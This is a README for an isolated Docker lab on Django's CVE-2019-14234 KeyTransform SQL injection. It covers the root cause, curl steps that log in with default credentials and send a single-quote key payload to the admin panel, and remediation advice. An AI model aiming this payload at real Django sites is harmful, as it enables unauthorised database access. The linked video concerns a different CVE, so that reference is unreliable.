# Django JSONField & HStoreField KeyTransform SQL Injection (CVE-2019-14234)

## Laboratory Overview

This laboratory provides an isolated, production-grade practice target for studying **Django JSONField & HStoreField KeyTransform SQL Injection (CVE-2019-14234)**.

- **Target Directory**: `Classes/02_web_penetration_tester/16_advanced_sql_injection/django_cve_2019_14234`
- **Default Port(s)**: `8236:8000`
- **CLI Shortcut**: `./lab start django-jsonfield-sqli`

---

## Architecture & Service Map

- **Containers**:
  - `cyberlab_02_django_14234_app` (Django 2.2.3 web application running on port 8000, mapped to host port 8236)
  - `cyberlab_02_django_14234_db` (PostgreSQL 9.6-alpine database service)
- **Network Mode**: Bridge (Isolated Docker network)
- **Resource Ceiling**: 1024 MB RAM limit
- **Default Credentials**: `admin` / `a123123123`

---

## Vulnerability Mechanics

In Django versions before 2.2.4, 2.1.11, and 1.11.23, `JSONField` and `HStoreField` on PostgreSQL backends were vulnerable to SQL injection through key transforms.

### Technical Root Cause

When querying PostgreSQL models using JSON field lookups (such as `model.objects.filter(detail__a'b=1)`), Django's `KeyTransform` constructs SQL expressions using PostgreSQL JSON operators (`->` or `->>`).

In affected versions, Django performed string formatting without sanitizing or parameterizing the JSON dictionary key names. Consequently, passing single quotes in key lookup paths breaks out of the PostgreSQL string literal in:

```sql
SELECT ... FROM "collection_collection" WHERE ("collection_collection"."detail" -> 'a'b') = '"1"'
```

This allows attackers to inject arbitrary SQL statements or extract sensitive database contents through user-controlled filter keys in applications or the built-in Django administration panel.

---

## Verification & Exploitation Guide

### 1. Verify Django Application Availability

Confirm the Django Admin service is up and serving requests:

```bash
curl -s -i "http://localhost:8236/admin/"
```

Expected output: `HTTP/1.1 200 OK` rendering the Django site admin login interface.

### 2. Authenticate to Django Admin

Extract the CSRF middleware token and login using default lab credentials (`admin` / `a123123123`):

```bash
curl -c cookies.txt -s http://localhost:8236/admin/ > login.html
CSRF=$(grep 'csrfmiddlewaretoken' login.html | sed -n 's/.*value="\([^"]*\)".*/\1/p' | head -n1)
curl -b cookies.txt -c cookies.txt -s -L \
  -d "username=admin&password=a123123123&csrfmiddlewaretoken=$CSRF&next=/admin/" \
  http://localhost:8236/admin/ > /dev/null
```

### 3. Trigger SQL Injection on KeyTransform

Send a GET request to the collection model list view containing a single-quote key transform payload:

```bash
curl -b cookies.txt -i -s "http://localhost:8236/admin/collection/collection/?detail__a%27b=1"
```

Expected output: `HTTP/1.1 500 Internal Server Error` with PostgreSQL database syntax error:

```text
ProgrammingError at /admin/collection/collection/
syntax error at or near "b') = '"
LINE 1: ...on" WHERE ("collection_collection"."detail" -> 'a'b') = '"1"...
                                                             ^
```

This confirms that unescaped key lookup parameters are interpolated directly into the database query expression.

---

## Defensive Remediation & Hardening

- **Upgrade Django**: Upgrade to patched Django releases `2.2.4+`, `2.1.11+`, or `1.11.23+`.
- **Input Validation**: Restrict and allowlist user-controllable lookup keys before passing them into Django ORM filter expressions.
- **Least Privilege**: Restrict database user privileges to minimize the impact of injection vulnerabilities.

---

## References & Advisories

- **Official Vulhub Repository**: [Vulhub Django CVE-2019-14234](https://github.com/vulhub/vulhub/tree/master/django/CVE-2019-14234)
- **Django Security Advisory**: [Django security releases: CVE-2019-14234 (August 1, 2019)](https://www.djangoproject.com/weblog/2019/aug/01/security-releases/)
- **Vulnerability Analysis**: [Leavesongs Django JSONField KeyTransform SQL Injection Analysis](https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html)

---

## Verified Video Walkthrough

- **Video Title**: [CRITICAL Django SQL Injection (CVE-2025-64459): Patch NOW or Get Hacked!](https://www.youtube.com/watch?v=Sj5-lFWqBu0)
- **Direct URL**: https://www.youtube.com/watch?v=Sj5-lFWqBu0
